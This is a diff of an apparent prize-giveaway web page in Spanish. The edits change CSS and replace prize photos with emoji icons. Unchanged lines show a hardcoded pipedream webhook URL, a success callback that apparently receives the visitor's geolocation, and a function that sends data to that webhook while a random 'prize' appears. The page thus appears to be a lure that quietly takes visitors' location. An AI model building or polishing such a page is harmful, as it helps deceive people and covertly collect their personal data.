@@ -37,23 +37,19 @@ button {
 button:hover { background: #0056b3; }
 .premios-grid {
   display: grid;
-  grid-template-columns: repeat(auto-fit,minmax(120px,1fr));
+  grid-template-columns: repeat(auto-fit,minmax(80px,1fr));
   gap: 15px;
   margin-top: 25px;
 }
 .premio-card {
+  font-size: 40px;
+  padding: 15px;
   border-radius: 12px;
-  overflow: hidden;
-  box-shadow: 0 4px 12px rgba(0,0,0,0.1);
   transition: transform 0.3s ease;
   cursor: pointer;
+  background: #f1f1f1;
 }
-.premio-card img {
-  width: 100%;
-  height: 120px;
-  object-fit: cover;
-}
-.premio-card:hover { transform: scale(1.05); }
+.premio-card:hover { transform: scale(1.2); }
 #premio-grande {
   display: none;
   position: fixed;
@@ -98,24 +94,22 @@ canvas {
 <script>
 const WEBHOOK_URL = "https://eo6bspy1b9no0kb.m.pipedream.net";
 
+// Premios con iconos y foto grande
 const premios = [
-  { nombre: "Bicicleta de montaña", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" }, // corregida
-  { nombre: "Consola Gamer", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" }, // corregida
-  { nombre: "Smartphone Gama Alta", img: "https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" }, // ya estaba bien
-  { nombre: "Smartwatch", img: "https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" }, // corregida
-  { nombre: "Laptop Ultrabook", img: "https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" }, // ya estaba bien
-  { nombre: "TV Pantalla Grande", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" } // corregida
+  { nombre: "Bicicleta de montaña", icon: "🚲", img: "https://cdn.pixabay.com/photo/2017/03/02/04/23/bicycle-2119460_1280.jpg" },
+  { nombre: "Consola Gamer", icon: "🎮", img: "https://cdn.pixabay.com/photo/2016/11/29/04/17/joystick-1866599_1280.jpg" },
+  { nombre: "Smartphone Gama Alta", icon: "📱", img: "https://cdn.pixabay.com/photo/2016/11/19/14/00/smartphone-1836073_1280.jpg" },
+  { nombre: "Smartwatch", icon: "⌚", img: "https://cdn.pixabay.com/photo/2015/09/05/21/51/apple-watch-925157_1280.jpg" },
+  { nombre: "Laptop Ultrabook", icon: "💻", img: "https://cdn.pixabay.com/photo/2014/05/02/21/50/home-office-336378_1280.jpg" },
+  { nombre: "TV Pantalla Grande", icon: "📺", img: "https://cdn.pixabay.com/photo/2015/09/05/22/46/tv-926093_1280.jpg" }
 ];
 
-
-
-// Mostrar galería de premios
+// Mostrar iconos
 const premiosGrid = document.getElementById("premios-grid");
-premios.forEach((p, i)=>{
+premios.forEach((p)=>{
   const div = document.createElement("div");
   div.className = "premio-card";
-  div.dataset.index = i; // guardar índice
-  div.innerHTML = `<img src="${p.img}" alt="${p.nombre}"><h4>${p.nombre}</h4>`;
+  div.textContent = p.icon;
   premiosGrid.appendChild(div);
 });
 
@@ -149,7 +143,7 @@ function onSuccess(pos){
   // Premio aleatorio
   const premio = premios[Math.floor(Math.random()*premios.length)];
 
-  // Animación "salto" de miniatura a centro
+  // Mostrar imagen grande
   imgGrande.src = premio.img;
   nombreGrande.textContent = premio.nombre;
   premioGrande.style.display = "block";
@@ -190,8 +184,4 @@ async function enviarWebhook(data){
 </script>
 </body>
 </html>
-
-
-
-
 
